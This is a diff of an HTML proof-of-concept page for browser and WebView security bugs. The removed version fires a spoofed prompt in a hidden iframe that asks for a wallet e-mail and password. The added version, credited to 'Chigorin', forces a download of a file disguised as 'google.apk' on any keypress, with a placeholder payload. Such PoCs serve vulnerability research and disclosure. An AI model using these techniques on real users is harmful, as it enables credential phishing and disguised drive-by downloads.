@@ -1,28 +1,42 @@
-<html lang="en-US">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, user-scalable=no">
-	<title> Bypass sandbox Webview UXss Delayed JavaScript execution leak to host app (Hax)</title>
-	
-	<style>
-		iframe {
-			visibility: hidden;
-		}
-	</style>
-   
-	<script>
-		window.onblur = function() {
-			document.getElementById("iframe").src = "javascript:prompt('In order to access haxwallet.com\\nyou must first login on your\\nHax Wallet Account.\\n\\nPlease type your e-mail\\nand your password:\\n', 'E-mail / Password.');";
-		}
-	</script>
+  <meta charset="UTF-8">
+  <title>Download & Fullscreen on Keypress</title>
 </head>
-
 <body>
-   <center>
-		<br>
-		<h1>Click Here</h1>
-	</center>
-   <iframe id="iframe"></iframe>
-</body>
+  <center><h2>POC by Chigorin!</h2></center>
 
+  <script>
+    // Listen to any keydown
+    window.addEventListener('keydown', function(e) {
+      // open the download
+      openWin();
+      // request fullscreen
+      //goFullScreen();
+    });
+
+    // Download helper
+    function Puf(uri, name) {
+      const link = document.createElement("a");
+      link.href = uri;
+      link.download = name;
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+
+    // Kick off your “APK” download
+    function openWin() {
+      Puf(
+        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
+        "google.apk"
+      );
+    }
+
+  </script>
+  
+
+  
+</body>
 </html>
